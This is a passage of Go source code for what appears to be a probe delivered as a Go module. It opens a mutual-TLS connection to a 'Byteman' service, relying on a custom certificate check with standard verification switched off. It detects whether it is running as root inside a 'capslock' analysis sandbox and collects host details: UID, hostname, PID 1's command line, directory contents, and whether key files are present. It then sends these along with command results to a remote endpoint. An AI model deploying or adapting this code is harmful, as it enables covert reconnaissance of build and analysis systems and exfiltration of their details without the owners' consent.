	if err != nil {
		return fmt.Errorf("Byteman TLS chain verification failed: %w", err)
	}
	return nil
}
func newBytemanClient() (*http.Client, string, error) {
	cert, err := tls.LoadX509KeyPair(clientCertificatePath, clientKeyPath)
	if err != nil {
		return nil, "", err
	}
	pem, err := os.ReadFile(serverPoolPath)
	if err != nil {
		return nil, "", err
	}
	roots, err := mountedPrivateRootPool(pem)
	if err != nil {
		return nil, "", err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, bytemanServiceHost)
	if err != nil {
		return nil, "", errors.New("direct Byteman service did not resolve")
	}
	var selected net.IP
	for _, candidate := range addresses {
		if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
			selected = candidate.IP
			break
		}
	}
	if selected == nil {
		return nil, "", errors.New("direct Byteman service had no private address")
	}
	rpcDialAddress = net.JoinHostPort(selected.String(), strconv.Itoa(bytemanServicePort))
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, RootCAs: roots, MinVersion: tls.VersionTLS12, ServerName: bytemanTLSServerName, InsecureSkipVerify: true, VerifyConnection: func(state tls.ConnectionState) error { return verifyLegacyLocalhost(state, roots) }}
	dialer := &net.Dialer{Timeout: callbackTimeout, KeepAlive: 30 * time.Second}
	transport := &http.Transport{Proxy: nil, DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
		return dialer.DialContext(ctx, network, rpcDialAddress)
	}, TLSClientConfig: tlsConfig, ForceAttemptHTTP2: true}
	endpoint := "https://" + net.JoinHostPort(bytemanServiceHost, strconv.Itoa(bytemanServicePort))
	return &http.Client{Transport: transport, Timeout: lookupHTTPTimeout}, endpoint, nil
}

func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{Version: protocolVersion, Session: callbackSessionNonce, ID: id, CWD: cwd, DurationMS: time.Since(started).Milliseconds()}
	if err != nil {
		result.ExitCode, result.Stderr = 125, cleanError(err)
	} else {
		result.Stdout = string(encoded)
	}
	return submitResult(endpoint, result)
}
func submitResult(endpoint string, result commandResult) error {
	body, err := json.Marshal(result)
	if err != nil || len(body) > maximumResultBytes {
		return errors.New("result envelope was invalid")
	}
	ctx, cancel := context.WithTimeout(context.Background(), callbackTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(body))
	if err != nil {
		return err
	}
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("X-Codex-Probe-Session", callbackSessionNonce)
	client := &http.Client{CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }, Timeout: callbackTimeout}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode != http.StatusCreated {
		return fmt.Errorf("result endpoint HTTP %d", response.StatusCode)
	}
	return nil
}
func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}
func inspectIdentity(cwd string) identityResult {
	lane := "other"
	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) && strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
		lane = "capslock"
	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
		lane = "generic"
	}
	hostname, _ := os.Hostname()
	result := identityResult{Lane: lane, CWD: cwd, UID: os.Geteuid(), GID: os.Getegid(), Hostname: hostname, PID1: strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " ")}
	if len(result.PID1) > 1024 {
		result.PID1 = result.PID1[:1024] + "[truncated]"
	}
	entries, _ := os.ReadDir(cwd)
	for _, entry := range entries {
		if len(result.ModuleFiles) >= 128 {
			break
		}
		if info, err := entry.Info(); err == nil {
			result.ModuleFiles = append(result.ModuleFiles, fileEntry{Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size()})
		}
	}
	for _, path := range []string{serverPoolPath, clientCertificatePath, clientKeyPath} {
		item := tlsFile{Path: path}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present, item.Mode, item.Size = true, info.Mode().String(), info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}
func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}
func cleanError(err error) string {
	if err == nil {
		return ""
	}
	return cleanSensitiveText(err.Error())
}
func cleanSensitiveText(value string) string {
	for _, secret := range []string{callbackSessionNonce, pinnedReadbackSession, pinnedReadbackURL, rpcDialAddress} {
		if secret != "" {
			value = strings.ReplaceAll(value, secret, "[redacted]")
		}
	}
	if len(value) > 1024 {
		value = value[:1024] + "[truncated]"
	}
	return value
}
